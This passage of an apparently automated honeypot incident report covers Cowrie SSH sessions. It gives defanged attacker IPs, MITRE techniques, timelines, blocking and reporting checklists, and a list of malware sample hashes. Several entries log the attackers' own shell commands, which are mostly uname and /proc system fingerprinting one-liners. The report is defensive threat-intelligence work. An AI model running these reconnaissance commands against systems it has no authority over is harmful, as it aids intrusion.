| `2026-07-26 14:03:39` | `cowrie.client.kex` |
| `2026-07-26 14:03:41` | `cowrie.login.success` |
| `2026-07-26 14:03:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c9d4f7b0eba

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-07-26 14:03 |
| **Last Seen** | 2026-07-26 14:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:03:47` | `cowrie.session.connect` |
| `2026-07-26 14:03:47` | `cowrie.client.version` |
| `2026-07-26 14:03:47` | `cowrie.client.kex` |
| `2026-07-26 14:03:48` | `cowrie.login.success` |
| `2026-07-26 14:03:49` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b62f4f2acce

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-26 14:08 |
| **Last Seen** | 2026-07-26 14:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:08:14` | `cowrie.session.connect` |
| `2026-07-26 14:08:15` | `cowrie.client.version` |
| `2026-07-26 14:08:15` | `cowrie.client.kex` |
| `2026-07-26 14:08:16` | `cowrie.login.success` |
| `2026-07-26 14:08:17` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5501c753e113

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-07-26 14:08 |
| **Last Seen** | 2026-07-26 14:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:08:22` | `cowrie.session.connect` |
| `2026-07-26 14:08:22` | `cowrie.client.version` |
| `2026-07-26 14:08:22` | `cowrie.client.kex` |
| `2026-07-26 14:08:24` | `cowrie.login.success` |
| `2026-07-26 14:08:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3527f2a7fbb6

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-07-26 14:18 |
| **Last Seen** | 2026-07-26 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:18:46` | `cowrie.session.connect` |
| `2026-07-26 14:18:47` | `cowrie.login.success` |
| `2026-07-26 14:18:47` | `cowrie.session.params` |
| `2026-07-26 14:18:48` | `cowrie.command.input` |
| `2026-07-26 14:18:48` | `cowrie.command.input` |
| `2026-07-26 14:18:49` | `cowrie.command.input` |
| `2026-07-26 14:18:50` | `cowrie.command.input` |
| `2026-07-26 14:18:50` | `cowrie.command.failed` |
| `2026-07-26 14:18:50` | `cowrie.log.closed` |
| `2026-07-26 14:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0f786ec3f6

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-26 14:24 |
| **Last Seen** | 2026-07-26 14:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:24:57` | `cowrie.session.connect` |
| `2026-07-26 14:24:58` | `cowrie.client.version` |
| `2026-07-26 14:24:58` | `cowrie.client.kex` |
| `2026-07-26 14:24:59` | `cowrie.login.success` |
| `2026-07-26 14:24:59` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81dc144a6f7e

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-26 14:25 |
| **Last Seen** | 2026-07-26 14:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:25:17` | `cowrie.session.connect` |
| `2026-07-26 14:25:18` | `cowrie.client.version` |
| `2026-07-26 14:25:18` | `cowrie.client.kex` |
| `2026-07-26 14:25:18` | `cowrie.login.success` |
| `2026-07-26 14:25:19` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c7b89c3a55

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]40` |
| **First Seen** | 2026-07-26 14:29 |
| **Last Seen** | 2026-07-26 14:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:29:40` | `cowrie.session.connect` |
| `2026-07-26 14:29:40` | `cowrie.client.version` |
| `2026-07-26 14:29:40` | `cowrie.client.kex` |
| `2026-07-26 14:29:42` | `cowrie.login.success` |
| `2026-07-26 14:29:43` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]40` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf12990bdf76

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-07-26 14:33 |
| **Last Seen** | 2026-07-26 14:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:33:05` | `cowrie.session.connect` |
| `2026-07-26 14:33:07` | `cowrie.client.version` |
| `2026-07-26 14:33:07` | `cowrie.client.kex` |
| `2026-07-26 14:33:09` | `cowrie.login.success` |
| `2026-07-26 14:33:11` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12caed5adb5d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-26 14:38 |
| **Last Seen** | 2026-07-26 14:38 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:38:45` | `cowrie.session.connect` |
| `2026-07-26 14:38:46` | `cowrie.client.version` |
| `2026-07-26 14:38:46` | `cowrie.client.kex` |
| `2026-07-26 14:38:51` | `cowrie.login.success` |
| `2026-07-26 14:38:57` | `cowrie.session.params` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.success` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:57` | `cowrie.command.input` |
| `2026-07-26 14:38:58` | `cowrie.log.closed` |
| `2026-07-26 14:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99eb683a966f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-26 14:40 |
| **Last Seen** | 2026-07-26 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:40:37` | `cowrie.session.connect` |
| `2026-07-26 14:40:37` | `cowrie.client.version` |
| `2026-07-26 14:40:37` | `cowrie.client.kex` |
| `2026-07-26 14:40:38` | `cowrie.login.success` |
| `2026-07-26 14:40:38` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:40:38` | `cowrie.direct-tcpip.ja4` |
| `2026-07-26 14:40:38` | `cowrie.direct-tcpip.data` |
| `2026-07-26 14:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190f887b6797

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-26 14:42 |
| **Last Seen** | 2026-07-26 14:43 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:42:40` | `cowrie.session.connect` |
| `2026-07-26 14:42:42` | `cowrie.client.version` |
| `2026-07-26 14:42:42` | `cowrie.client.kex` |
| `2026-07-26 14:42:50` | `cowrie.login.success` |
| `2026-07-26 14:43:00` | `cowrie.session.params` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.success` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:00` | `cowrie.command.input` |
| `2026-07-26 14:43:01` | `cowrie.log.closed` |
| `2026-07-26 14:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2604a5aaf096

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-26 14:43 |
| **Last Seen** | 2026-07-26 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:43:25` | `cowrie.session.connect` |
| `2026-07-26 14:43:25` | `cowrie.client.version` |
| `2026-07-26 14:43:25` | `cowrie.client.kex` |
| `2026-07-26 14:43:26` | `cowrie.login.success` |
| `2026-07-26 14:43:26` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:43:26` | `cowrie.direct-tcpip.ja4` |
| `2026-07-26 14:43:26` | `cowrie.direct-tcpip.data` |
| `2026-07-26 14:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005689399060

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-26 14:46 |
| **Last Seen** | 2026-07-26 14:46 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:46:18` | `cowrie.session.connect` |
| `2026-07-26 14:46:20` | `cowrie.client.version` |
| `2026-07-26 14:46:20` | `cowrie.client.kex` |
| `2026-07-26 14:46:28` | `cowrie.login.success` |
| `2026-07-26 14:46:30` | `cowrie.session.params` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.success` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:30` | `cowrie.command.input` |
| `2026-07-26 14:46:31` | `cowrie.log.closed` |
| `2026-07-26 14:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6a07a170352

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-07-26 14:46 |
| **Last Seen** | 2026-07-26 14:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:46:43` | `cowrie.session.connect` |
| `2026-07-26 14:46:43` | `cowrie.client.version` |
| `2026-07-26 14:46:43` | `cowrie.client.kex` |
| `2026-07-26 14:46:45` | `cowrie.login.success` |
| `2026-07-26 14:46:46` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ff373dbe7f

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-07-26 14:50 |
| **Last Seen** | 2026-07-26 14:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:50:11` | `cowrie.session.connect` |
| `2026-07-26 14:50:11` | `cowrie.client.version` |
| `2026-07-26 14:50:11` | `cowrie.client.kex` |
| `2026-07-26 14:50:12` | `cowrie.login.success` |
| `2026-07-26 14:50:12` | `cowrie.direct-tcpip.request` |
| `2026-07-26 14:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e971a0efefbc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-26 14:52 |
| **Last Seen** | 2026-07-26 14:53 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 14:52:53` | `cowrie.session.connect` |
| `2026-07-26 14:52:56` | `cowrie.client.version` |
| `2026-07-26 14:52:56` | `cowrie.client.kex` |
| `2026-07-26 14:53:04` | `cowrie.login.success` |
| `2026-07-26 14:53:07` | `cowrie.session.params` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.success` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:07` | `cowrie.command.input` |
| `2026-07-26 14:53:09` | `cowrie.log.closed` |
| `2026-07-26 14:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.228.36[.]205` | **62** | 2026-07-26 13:14 | 2026-07-26 13:16 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-07-26 13:11 | 2026-07-26 14:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `95.181.232[.]51` | **4** | 2026-07-26 14:00 | 2026-07-26 14:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | **3** | 2026-07-26 13:12 | 2026-07-26 14:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-26 14:33 | 2026-07-26 14:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-26 13:22 | 2026-07-26 13:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-26 13:01 | 2026-07-26 13:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-07-26 13:36 | 2026-07-26 14:49 | 2m | 0 | `T1592` | 🟢 LOW |
| `135.237.124[.]21` | **2** | 2026-07-26 13:38 | 2026-07-26 13:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-07-26 14:39 | 2026-07-26 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-26 14:30 | 2026-07-26 14:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **2** | 2026-07-26 13:07 | 2026-07-26 13:21 | 1m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-07-26 14:31 | 2026-07-26 14:49 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.182.234[.]231` | 1 | 2026-07-26 14:13 | 2026-07-26 14:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-07-26 14:04 | 2026-07-26 14:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]131` | 1 | 2026-07-26 14:25 | 2026-07-26 14:25 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.233.58[.]147` | 1 | 2026-07-26 14:25 | 2026-07-26 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-07-26 14:33 | 2026-07-26 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-26 13:06 | 2026-07-26 13:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]5` | 1 | 2026-07-26 14:25 | 2026-07-26 14:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-26 14:36 | 2026-07-26 14:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-26 14:33 | 2026-07-26 14:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-26 13:35 | 2026-07-26 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-07-26 13:57 | 2026-07-26 13:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]210` | 1 | 2026-07-26 14:18 | 2026-07-26 14:18 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
